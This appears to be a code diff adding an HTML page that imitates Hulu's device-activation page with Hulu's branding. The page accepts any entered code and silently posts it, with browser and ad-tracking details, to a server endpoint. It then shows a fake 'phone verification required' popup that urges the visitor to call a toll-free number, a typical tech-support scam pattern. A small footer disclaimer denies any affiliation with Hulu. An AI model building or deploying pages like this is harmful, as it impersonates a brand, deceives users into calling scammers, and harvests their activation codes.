@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <!-- Google Tag: Paste your new Google Ads tag here -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Activate Hulu — Link Your Device</title>
+    <style>
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; background: #fff; color: #0f1111; font-size: 14px; }
+        .pv-nav { background: #1ce783; display: flex; align-items: center; justify-content: space-between; padding: 0 24px; height: 58px; }
+        .pv-nav-left { display: flex; align-items: center; gap: 28px; }
+        .pv-logo { display: flex; align-items: center; gap: 10px; text-decoration: none; }
+        .pv-logo-text { color: #000; font-size: 1.3rem; font-weight: 900; letter-spacing: -0.5px; }
+        .pv-nav-links { display: flex; gap: 20px; list-style: none; }
+        .pv-nav-links a { color: #000; text-decoration: none; font-size: 0.85rem; font-weight: 600; }
+        .pv-nav-links a:hover { opacity: 0.7; }
+        .pv-nav-right a { color: #000; text-decoration: none; font-size: 0.85rem; font-weight: 700; }
+        .page-wrap { max-width: 960px; margin: 0 auto; padding: 36px 20px 60px; display: grid; grid-template-columns: 1fr 280px; gap: 48px; align-items: start; }
+        .register-section h1 { font-size: 1.55rem; font-weight: 700; color: #111; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid #e0e0e0; }
+        .register-box { border: 1px solid #ddd; border-radius: 6px; padding: 24px 28px 22px; margin-bottom: 28px; }
+        .register-box h2 { font-size: 1rem; font-weight: 700; margin-bottom: 8px; }
+        .register-box .sub { color: #555; font-size: 0.87rem; line-height: 1.5; margin-bottom: 20px; }
+        .input-row { display: flex; align-items: center; gap: 12px; margin-bottom: 12px; flex-wrap: wrap; }
+        .input-label { font-size: 0.87rem; font-weight: 700; white-space: nowrap; min-width: 120px; }
+        .code-input { flex: 1; min-width: 160px; max-width: 220px; height: 36px; border: 1px solid #888; border-radius: 4px; padding: 0 10px; font-size: 1rem; letter-spacing: 1px; outline: none; transition: border-color 0.15s, box-shadow 0.15s; }
+        .code-input:focus { border-color: #1ce783; box-shadow: 0 0 0 3px rgba(28,231,131,0.25); }
+        .code-input::placeholder { color: #aaa; letter-spacing: 0; }
+        .register-btn { height: 36px; padding: 0 20px; background: #1ce783; border: none; border-radius: 4px; font-size: 0.88rem; font-weight: 700; color: #000; cursor: pointer; transition: background 0.15s; }
+        .register-btn:hover { background: #17d474; }
+        .terms-note { font-size: 0.75rem; color: #555; line-height: 1.4; }
+        .terms-note a { color: #1a7a3a; text-decoration: none; }
+        .where-section h3 { font-size: 0.95rem; font-weight: 700; margin-bottom: 16px; }
+        .steps-row { display: flex; gap: 20px; }
+        .step-item { flex: 1; display: flex; flex-direction: column; gap: 6px; }
+        .step-num { font-size: 0.8rem; font-weight: 700; color: #555; }
+        .step-text { font-size: 0.82rem; color: #111; line-height: 1.45; }
+        .step-divider { width: 1px; background: #e0e0e0; align-self: stretch; flex-shrink: 0; }
+        .logo-aside { display: flex; justify-content: flex-end; padding-top: 8px; }
+        .error-msg { display: none; color: #b12704; font-size: 0.85rem; margin-top: 6px; padding: 8px 12px; background: #fff8f4; border: 1px solid #f5c6c0; border-radius: 4px; }
+        .error-msg.visible { display: block; }
+        .site-footer { background: #111; color: #888; text-align: center; padding: 20px; font-size: 0.75rem; margin-top: 60px; }
+        .site-footer a { color: #aaa; text-decoration: none; margin: 0 10px; }
+        .site-footer .disclaimer { max-width: 700px; margin: 10px auto 0; color: #555; font-size: 0.7rem; line-height: 1.5; }
+        #successOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.75); z-index: 9999; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(4px); animation: fadeIn 0.25s ease; }
+        #successOverlay.active { display: flex; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        #successModal { background: #fff; border-radius: 12px; padding: 0 36px 32px; max-width: 440px; width: 100%; text-align: center; box-shadow: 0 24px 80px rgba(0,0,0,0.45); animation: slideUp 0.3s cubic-bezier(0.34,1.56,0.64,1); overflow: hidden; }
+        .popup-logo-band { background: #1ce783; margin: 0 -36px 28px; padding: 18px 24px; display: flex; align-items: center; justify-content: center; }
+        .popup-logo-text { color: #000; font-size: 1.5rem; font-weight: 900; letter-spacing: -0.5px; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px) scale(0.95); } to { opacity: 1; transform: translateY(0) scale(1); } }
+        .success-check { width: 64px; height: 64px; background: #16a34a; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
+        .success-check svg { color: #fff; }
+        .success-title { font-size: 1.35rem; font-weight: 800; color: #111; margin-bottom: 6px; }
+        .success-subtitle { font-size: 1rem; font-weight: 700; color: #b12704; margin-bottom: 16px; }
+        .success-body { font-size: 0.88rem; color: #555; line-height: 1.55; margin-bottom: 28px; }
+        .success-body strong { color: #111; }
+        .call-btn { display: flex; align-items: center; justify-content: center; gap: 10px; background: #16a34a; color: #fff; text-decoration: none; font-size: 1.15rem; font-weight: 800; padding: 16px 28px; border-radius: 60px; width: 100%; transition: background 0.2s, transform 0.15s; box-shadow: 0 6px 24px rgba(22,163,74,0.4); }
+        .call-btn:hover { background: #15803d; transform: translateY(-2px); }
+        .avail-note { font-size: 0.78rem; color: #6c757d; margin-top: 12px; display: flex; align-items: center; justify-content: center; gap: 6px; }
+        .avail-dot { width: 8px; height: 8px; background: #16a34a; border-radius: 50%; animation: pulse 1.8s infinite; }
+        @keyframes pulse { 0%,100% { box-shadow: 0 0 0 0 rgba(22,163,74,0.5); } 50% { box-shadow: 0 0 0 5px rgba(22,163,74,0); } }
+        @media (max-width: 680px) { .page-wrap { grid-template-columns: 1fr; } .logo-aside { justify-content: flex-start; } .steps-row { flex-direction: column; } .step-divider { display: none; } .pv-nav-links { display: none; } .input-row { flex-direction: column; align-items: flex-start; } #successModal { padding: 32px 22px 28px; } }
+    </style>
+</head>
+<body>
+<nav class="pv-nav">
+    <div class="pv-nav-left">
+        <a href="/hulu" class="pv-logo"><span class="pv-logo-text">hulu</span></a>
+        <ul class="pv-nav-links"><li><a href="#">Home</a></li><li><a href="#">TV</a></li><li><a href="#">Movies</a></li><li><a href="#">Live TV</a></li></ul>
+    </div>
+    <div class="pv-nav-right"><a href="#">Log In</a></div>
+</nav>
+
+<div class="page-wrap">
+    <div class="register-section">
+        <h1>Activate your device</h1>
+        <div class="register-box">
+            <h2>Link your TV or streaming device to Hulu</h2>
+            <p class="sub">Open the Hulu app on your TV or streaming device. An activation code will appear on screen — enter it below to link your device to your Hulu account.</p>
+            <div id="errorMsg" class="error-msg">Please enter a valid activation code (e.g. A3B7K2).</div>
+            <div class="input-row">
+                <span class="input-label">Activation code</span>
+                <input type="text" id="codeInput" class="code-input" placeholder="e.g. A3B7K2" maxlength="10" autocomplete="off" spellcheck="false">
+                <button class="register-btn" onclick="handleRegister()">Activate Device</button>
+            </div>
+            <p class="terms-note">By continuing, you agree to the <a href="#">Hulu Subscriber Agreement</a>.</p>
+        </div>
+        <div class="where-section">
+            <h3>Where's my activation code?</h3>
+            <div class="steps-row">
+                <div class="step-item"><span class="step-num">Step 1</span><span class="step-text">Open the Hulu app on your TV or streaming device.</span></div>
+                <div class="step-divider"></div>
+                <div class="step-item"><span class="step-num">Step 2</span><span class="step-text">Select "Log In" and then "Activate on a computer."</span></div>
+                <div class="step-divider"></div>
+                <div class="step-item"><span class="step-num">Step 3</span><span class="step-text">Your activation code appears on your TV screen.</span></div>
+            </div>
+        </div>
+    </div>
+    <div class="logo-aside">
+        <svg viewBox="0 0 180 80" width="180" fill="none">
+            <rect x="0" y="8" width="48" height="48" rx="10" fill="#1ce783"/>
+            <text x="8" y="42" font-family="Arial" font-weight="900" font-size="18" fill="#000">hulu</text>
+            <text x="60" y="40" font-family="Arial" font-weight="900" font-size="20" fill="#1ce783">hulu</text>
+        </svg>
+    </div>
+</div>
+
+<footer class="site-footer">
+    <div><a href="/">Home</a><a href="/privacy-policy">Privacy Policy</a><a href="/terms-of-service">Terms of Service</a></div>
+    <p class="disclaimer">This page is operated by an independent support service and is not affiliated with, endorsed by, or connected to Hulu or The Walt Disney Company. All product names, trademarks, and logos are property of their respective owners.</p>
+</footer>
+
+<div id="successOverlay" role="dialog" aria-modal="true" aria-labelledby="successTitle">
+    <div id="successModal">
+        <div class="popup-logo-band"><span class="popup-logo-text">hulu</span></div>
+        <div class="success-check"><svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
+        <div class="success-title" id="successTitle">Code Redeemed Successfully!</div>
+        <div class="success-subtitle">&#9888; Phone Verification Required</div>
+        <p class="success-body">Your activation code has been accepted. To complete your device setup, <strong>phone verification is required</strong> by our support team.<br><br>Please call the number below to verify your account and finish activating Hulu on your TV.</p>
+        <a class="call-btn" href="tel:+18886088345" id="popupCallBtn">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+            Call +1 888-608-8345
+        </a>
+        <div class="avail-note"><span class="avail-dot"></span>Available 24/7 &mdash; Toll-Free Support</div>
+    </div>
+</div>
+<script>
+    function handleRegister() {
+        var code = document.getElementById('codeInput').value.trim();
+        var errorMsg = document.getElementById('errorMsg');
+        if (code.length < 4) { errorMsg.classList.add('visible'); document.getElementById('codeInput').focus(); return; }
+        errorMsg.classList.remove('visible');
+        try { var p = new URLSearchParams(window.location.search); fetch('/api/v1/event', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'code_submit', code: code, sw: screen.width, sh: screen.height, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, referrer: document.referrer, utm_source: p.get('utm_source')||'', utm_campaign: p.get('utm_campaign')||'', utm_term: p.get('utm_term')||'', utm_content: p.get('utm_content')||'', gclid: p.get('gclid')||'' }) }).catch(function(){}); } catch(e) {}
+        document.getElementById('successOverlay').classList.add('active'); document.body.style.overflow = 'hidden';
+    }
+    document.getElementById('popupCallBtn').addEventListener('click', function(e) { e.preventDefault(); try { fetch('/api/v1/event', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ type: 'call_click', code: document.getElementById('codeInput').value.trim() }) }).catch(function(){}); } catch(e){} window.location.href = this.href; });
+    document.getElementById('codeInput').addEventListener('keydown', function(e) { if (e.key === 'Enter') handleRegister(); });
+    document.getElementById('codeInput').addEventListener('input', function() { this.value = this.value.toUpperCase().replace(/[^A-Z0-9]/g, ''); });
+</script>
+</body>
+</html>
